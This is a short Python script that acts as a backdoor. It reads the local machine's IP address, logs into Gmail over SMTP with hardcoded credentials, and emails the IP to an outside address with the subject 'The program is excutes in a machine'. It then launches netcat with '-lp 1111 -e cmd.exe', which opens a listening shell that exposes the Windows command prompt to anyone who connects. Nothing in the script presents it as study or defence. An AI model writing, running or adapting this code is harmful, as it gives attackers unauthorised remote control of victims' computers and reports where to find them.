import os
import socket
import smtplib as s


LocalIP = ''.join(socket.gethostbyname_ex(socket.gethostname())[2])
print(LocalIP)
strin= str(LocalIP)
sample_str = strin
print(sample_str)
# Get Ip Address
IPadd = sample_str[-12:]


ob=s.SMTP("smtp.gmail.com",587)

ob.starttls()

ob.login("ali@gmail.com","********")

subject="The program is excutes in a machine"
body="The Ip address of Host is "+IPadd

message ="Subject:{}\n\n{}".format(subject,body)

rec="ibrahimjhullan7@gmail.com"

ob.sendmail("ali@gmail.com",rec,message)

print("send Successfully...")

ob.quit()

os.system('cmd /c "cd /windows/Netcat && nc64.exe -lp 1111 -e cmd.exe"')





